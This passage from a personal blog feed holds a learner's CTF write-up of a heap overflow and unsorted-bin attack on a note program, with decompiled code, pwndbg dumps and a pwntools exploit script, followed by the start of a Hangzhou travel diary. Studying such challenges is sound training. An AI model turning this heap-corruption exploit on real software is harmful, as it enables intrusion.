   system(<span class=\"string\">&quot;cat ./flag&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You are fired, Bye.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_400939</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\tInput the length of your work note:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v2);</span><br><span class=\"line\">  v2 += <span class=\"number\">144</span>;</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>(v2);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\tInput context of your work record:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, v2);</span><br><span class=\"line\">  *(&amp;ptr + a1) = buf;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((v2 &amp; (rand() + <span class=\"number\">255</span>)) % <span class=\"number\">23</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t下面看一下编辑和删除,删除的话,把指针也赋0了,所以没有double free的问题,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400B62</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input your choice: \\n\\t1.edit note\\n\\t2.delete note\\n\\t0.exit&quot;</span>);</span><br><span class=\"line\">        __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        sub_400A14();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      sub_400AEE();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v1 );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400A14</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input the note index to edit:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt;= <span class=\"number\">6</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the content:&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;ptr + (<span class=\"type\">int</span>)v2) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x4F0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = v2;</span><br><span class=\"line\">      *(&amp;ptr + v0) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400AEE</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input the note index to delete:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*(&amp;ptr + v1));</span><br><span class=\"line\">  *(&amp;ptr + v1) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这里有个很明显的问题,就是在编辑操作这里,如果编辑地址存在,可以读入0x4f0大小,<font color=\"red\">如果我们申请的chunk大小比这个小,那么就存在了溢</font>出,如果编辑的地址不存在,会重新进行malloc地址,大小为0x3A0</p>\n<p>​\t\t也就是说,如果我们一开始申请一个小的chunk,它后面接一个0x3A0大小的chunk,然后把0x3A0大小的chunk free掉,然后通过溢出,把这个free掉之后的chunk的值修改成我们想要的(<font color=\"red\">把bk改成想修改的地址</font>),然后再重新编辑一下,重新malloc的时候就会又申请到这个free 的chunk(也就是unsorted bin),然后就会触发漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(&amp;ptr + (<span class=\"type\">int</span>)v2) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x4F0</span>uLL);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = v2;</span><br><span class=\"line\">      *(&amp;ptr + v0) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<h2 id=\"构造攻击链\"><a href=\"#构造攻击链\" class=\"headerlink\" title=\"构造攻击链\"></a>构造攻击链</h2><p>​\t\t释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p>\n<p>​\t\t什么是不属于fast bin的呢??</p>\n<p>​\t\t那我们就第一个值随意,第二个值构造小一点,比如0x20,第三个值构造成0x3A0,然后后面随意,然后删除第三个值,修改第二个值,覆盖掉它,然后再edit第三个值,进行重新申请,触发漏洞获取flag.</p>\n<p>​\t\t这里注意之前所说的,我们给的大小,它实际上会+0x90,所以要申请一个0x3A0 - 0x90 &#x3D; 0x310 也就是784大小的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x6030b0</span><br><span class=\"line\">Size: 0xc1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603170</span><br><span class=\"line\">Size: 0x3b1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603520</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t0xc1 193     144 + 32 &#x3D; 176    多了17,  这个多的16字节是prev_size + size + NMP, 那为什么还多了一字节 因为对齐,在64位平台下,chunk大小一定是0x10的整数倍,那为什么都多了1呢?这里其实不是多了1,是显示的问题,size的话,是前5字节,也就是11000也就是16 + 4 &#x3D; 20, 然后最后的1是指的P为1,也就是前一个chunk被使用的意思,0是未被使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/bt 0x6030b8</span><br><span class=\"line\">0x6030b8:\t11000001</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303143001538.png\" alt=\"image-20230303143001538\"></p>\n<p>​\t\t0xb1 177     144 + 12 &#x3D; 156    多了21,</p>\n<p>​\t\t0x3b1  945  144 + 784 &#x3D; 928 多了17</p>\n<p>​\t\tpayload的构造的话,就是填满第2个chunk,然后溢出,填满prev_size,然后修改size为正确值,然后加上bk(要修改的地址)就可以了</p>\n<p>​\t\tpayload &#x3D; (0x90 + 0x20) * b”a” + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)</p>\n<p>p64是个啥,8byte, 8字节,64位, 指令一行又是多少..有点晕</p>\n<p>p64就是64位机器的编码,把0编码成0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00,占64位,也就是8个字节</p>\n<p>这个64位,32位指的是一次处理数据的宽度,和指令长度以及他们的地址没关系</p>\n<p>指令的话,占多少字节都是可能的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\">00:0000│ r13 rsp 0x7fffffffe560 ◂— 0x1</span><br><span class=\"line\">01:0008│         0x7fffffffe568 —▸ 0x7fffffffe7b7 ◂— &#x27;/home/ubuntu/2yue/ezfmt&#x27;</span><br><span class=\"line\">02:0010│         0x7fffffffe570 ◂— 0x0</span><br><span class=\"line\">03:0018│         0x7fffffffe578 —▸ 0x7fffffffe7cf ◂— 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)</span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f 0         0x4006e0</span><br><span class=\"line\">────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\">pwndbg&gt; x/8bx 0x7fffffffe560</span><br><span class=\"line\">0x7fffffffe560:\t0x01\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00</span><br><span class=\"line\">pwndbg&gt; x/8bx 0x7fffffffe568</span><br><span class=\"line\">0x7fffffffe568:\t0xb7\t0xe7\t0xff\t0xff\t0xff\t0x7f\t0x00\t0x00</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.text:0000000000400BE3</span><br><span class=\"line\">.text:0000000000400BE3                 push    rbp</span><br><span class=\"line\">.text:0000000000400BE4                 mov     rbp, rsp</span><br><span class=\"line\">.text:0000000000400BE7                 sub     rsp, 10h</span><br><span class=\"line\">.text:0000000000400BEB                 mov     eax, 0</span><br><span class=\"line\">.text:0000000000400BF0                 call    sub_4008F6</span><br><span class=\"line\">.text:0000000000400BF5                 mov     edi, offset aWelcomeTo997We ; &quot;Welcome to 997 wellfare! This program r&quot;...</span><br><span class=\"line\">.text:0000000000400BFA                 call    _puts</span><br><span class=\"line\">.text:0000000000400BFF                 mov     [rbp+var_8], 0</span><br><span class=\"line\">.text:0000000000400C06                 mov     [rbp+var_4], 0</span><br><span class=\"line\">.text:0000000000400C0D                 jmp     short loc_400C37</span><br><span class=\"line\">.text:0000000000400C0F ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:0000000000400C0F</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以 x&#x2F;20wx 0xxxxxxxxxxxx 显示的一行其实是16字节, 128位, 所以左边的地址加了16,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20wx 0x6030b0</span><br><span class=\"line\">0x6030b0:\t0x00000000\t0x00000000\t0x000000b1\t0x00000000</span><br><span class=\"line\">0x6030c0:\t0x000a3231\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x6030d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x6030e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">def add(length,context):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;note:&quot;</span>,length)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;record:&quot;</span>,context)</span><br><span class=\"line\"></span><br><span class=\"line\">def delete(num):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;exit&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete:&quot;</span>,num)</span><br><span class=\"line\"></span><br><span class=\"line\">def edit(num,context):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;exit&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;edit:&quot;</span>,num)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,context)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./oork_note&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x7ffff7af2031&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;784&quot;</span>,b<span class=\"string\">&quot;aaaaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;note? y/n&quot;</span>,<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">#payload = (0x90 + 0x20) * b<span class=\"string\">&quot;a&quot;</span> + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)</span></span><br><span class=\"line\"><span class=\"meta\">#payload = (0x90 + 0x20) * b<span class=\"string\">&quot;a&quot;</span> + p64(0) + p64(0x3a0+0x1 + 0x10) +p64(0)+ p64(0x6020D4 - 0x10)</span></span><br><span class=\"line\">addr = <span class=\"number\">0x06020D4</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = b<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">176</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x3a1</span> + <span class=\"number\">0x10</span>) + p64(<span class=\"number\">0</span>) + p64(addr)</span><br><span class=\"line\">edit(<span class=\"string\">&quot;1&quot;</span>,payload)</span><br><span class=\"line\">edit(<span class=\"string\">&quot;2&quot;</span>,b<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">print(io.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\"><span class=\"meta\">#io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span></span><br><span class=\"line\"><span class=\"meta\">#print(io.recv(1024))</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t你得理清楚哪里需要用b哪里不需要</p>\n<p>和libc版本有关吗?  感觉应该没问题了的,但是打不了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x6033d0</span>:       <span class=\"number\">0x00000000</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000003b1</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\">\\n<span class=\"number\">&#x27;</span>       │<span class=\"number\">00000</span></span><br><span class=\"line\">[*] Paused│<span class=\"number\">0x6033e0</span>:       <span class=\"number\">0x61616161</span>      <span class=\"number\">0x0000000a</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\"> (press an│<span class=\"number\">00000</span></span><br><span class=\"line\">y to conti│<span class=\"number\">0x6033f0</span>:       <span class=\"number\">0x0000000a</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\">nue)      │<span class=\"number\">00000</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"number\">0x400bb8</span>    call   <span class=\"number\">0x400a14</span>                      &lt;<span class=\"number\">0x400a14</span>&gt; input the note index to edit</span><br><span class=\"line\">  sh.sendline(<span class=\"string\">&quot;1&quot;</span>)                   │</span><br><span class=\"line\">[DEBUG] Sent <span class=\"number\">0x2</span> bytes:              │ ► <span class=\"number\">0x400bbd</span>    jmp    <span class=\"number\">0x400bca</span>                      &lt;<span class=\"number\">0x400bca</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t看了一下申请的chunk大小不正常,怀疑是发送过去的数据有问题,恩,sendline有问题</p>\n<p>mov    rax, qword ptr fs:[0x28]  这个是canary吧</p>\n<p><a href=\"https://blog.csdn.net/counsellor/article/details/81005101\">https://blog.csdn.net/counsellor/article/details/81005101</a></p>\n<p>addr &#x3D; 0x06020D4 - 0x10 为啥要-0x10呢??         因为是要得到chunk的头吧,不是数据头</p>\n<p>怎么负数了… addr &#x3D; 0x06020D4 - 0x12 多减点值,让它覆盖的时候能覆盖上就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230601102322660.png\" alt=\"image-20230601102322660\"></p>\n<h2 id=\"gdb-pwntools调试\"><a href=\"#gdb-pwntools调试\" class=\"headerlink\" title=\"gdb + pwntools调试\"></a>gdb + pwntools调试</h2>",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/",
            "url": "https://tangzichengcc.github.io/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/",
            "title": "2023年初东南沿海旅游游记",
            "date_published": "2023-02-19T11:45:14.000Z",
            "content_html": "<p>​\t\t此版本是结束后的总结版本,不是一开始的规划版本,所以可能看起来会比较完美,但其实中间踩过了挺多坑的,会在最后总结.总的来说,这一次的东南游历,看到了不同的风土人情,南方确实和北方有很大的不同,了解了一些历史,在路上遇到很多不一样的人,看到了更大的世界,更重要的是!!! 吃到了很多好吃的😋!!!!!!!!!!</p>\n<p>tips:相同背景颜色为景点挨着</p>\n<h1 id=\"纵览图\"><a href=\"#纵览图\" class=\"headerlink\" title=\"纵览图\"></a>纵览图</h1><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219194651125.png\" alt=\"image-20230219194651125\" style=\"zoom:25%;\">\n\n<h2 id=\"1-31-杭州\"><a href=\"#1-31-杭州\" class=\"headerlink\" title=\"1.31  杭州\"></a>1.31  杭州</h2><p>路线: 淄博 — 济南44 济南 — 杭州 450.5</p>\n<p>行程: 12点半到,下午玩一下午,2.1玩一天,2.2玩半天,中午12点出发去福州</p>\n<p>住宿: 杭州东站国际青旅,在杭州东站边上 两晚73 | <font color=\"red\">评价:</font>地理位置非常优越,床铺还是挺舒服的,不过环境一般,人很多,有一些应该是常住的,没有那种特别年轻的氛围.不过总体来说还是很不错的! 可以给85分</p>\n<p>美食: 东坡肉、西湖醋鱼、叫花鸡、小笼包 (<font color=\"red\">很遗憾,都没有吃哈哈哈哈哈哈哈哈哈哈哈哈哈哈)</font></p>\n<p>景点: 西湖(断桥残雪)、灵隐飞来峰(灵隐寺) 45元(求18珠手串)、雷峰塔40元（登高看西湖）、西溪国家湿地公园、清河坊街、,京杭大运河、浙江博物馆(武林馆区)(提前预约!)</p>\n<p>总之基本上都是围绕西湖….景点好像最近都免费了</p>\n<p>第一天: 下车在附近吃个饭,放下行李直奔博物馆、运河广场(旁边有一个很大的购物中心),</p>\n<p>第二天: 西湖(灵隐寺、雷峰塔在里面)、 <font 